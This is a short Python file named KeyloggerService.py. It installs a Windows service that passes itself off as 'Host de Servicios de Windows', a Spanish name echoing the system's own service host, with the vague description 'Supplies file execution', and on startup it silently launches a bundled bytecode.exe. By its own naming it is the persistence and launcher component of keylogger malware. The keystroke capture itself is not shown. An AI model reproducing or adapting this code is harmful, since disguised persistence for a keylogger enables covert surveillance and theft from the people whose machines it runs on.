# KeyloggerService.py
import subprocess
import win32serviceutil
import win32service
import win32event
import servicemanager
import re
import threading
import requests
import win32timezone
import sys
import os

class KeyloggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "Host de Servicios de Windows"
    _svc_display_name_ = "Host de Servicios de Windows"
    _svc_description_ = "Supplies file execution"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.running = True
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.running = False
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        self.running = True
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        self.main()

    def main(self):
        directorio_script = sys.executable
        directorio_script = os.path.dirname(os.path.abspath(directorio_script))
        print("directory: ", directorio_script+r'\bytecode.exe')
        directorio_script = directorio_script+r'\bytecode.exe'
        subprocess.Popen(directorio_script)
            
if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(KeyloggerService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(KeyloggerService)
